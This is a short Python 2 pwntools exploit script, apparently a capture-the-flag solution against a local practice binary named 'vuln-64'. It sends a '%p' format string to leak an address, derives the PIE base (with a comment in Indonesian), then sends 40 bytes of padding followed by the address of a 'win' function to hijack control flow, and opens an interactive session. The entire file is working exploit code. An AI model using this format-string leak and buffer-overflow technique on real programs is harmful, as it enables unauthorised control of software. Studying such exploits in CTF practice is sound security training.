#!/usr/bin/python2

from pwn import *

p = process('./vuln-64')
binary = ELF('./vuln-64')
p.recvuntil('name?\n')
p.sendline('%p')

p.recvuntil('you ')
pie = int(p.recvline(),16)
print(hex(pie))

binary.address = pie - 0x2016 #vmmap paling kiri atas - 0x5 dari leak nya.

payload = ''
payload += 'A'*40
payload += p64(binary.sym['win'])

p.sendline(payload)
p.interactive()